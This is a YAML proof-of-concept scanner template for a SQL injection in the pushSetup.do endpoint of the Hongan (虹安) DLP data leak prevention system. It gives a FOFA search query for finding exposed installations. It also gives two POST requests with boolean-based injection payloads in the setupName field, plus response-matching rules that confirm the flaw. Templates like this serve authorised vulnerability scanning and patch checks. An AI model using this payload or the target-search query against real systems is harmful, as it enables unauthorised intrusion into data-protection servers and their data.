id: poc-yaml-heimdall-dlp-pushSetup-sqli
info:
  name: 虹安DLP数据泄漏防护系统pushSetup.do存在SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 虹安DLP数据泄漏防护系统
  fofa: body="userReg/initUserReg.do"
requests:
- method: POST
  path: /dlp/userReg/pushSetup.do
  headers:
    Content-Type: application/x-www-form-urlencoded
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  data: setupName=1'+or+1%3d0+and+'1'%3d'1
  expression: "status_code == 200 && \ncontains(body,`alert(\"用户不存在!\");`) &&\n!contains(body,`alert(\"\
    用户未生成证书\");`) &&\ncontains(title,\"New Document\")\n"
- method: POST
  path: /dlp/userReg/pushSetup.do
  headers:
    Content-Type: application/x-www-form-urlencoded
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  data: setupName=1'+or+1%3d1+and+'1'%3d'1
  expression: "status_code == 200 && \n!contains(body,`alert(\"用户不存在!\");`) &&\ncontains(body,`alert(\"\
    用户未生成证书\");`) &&\ncontains(title,\"New Document\")\n"
variables: {}
transport: http
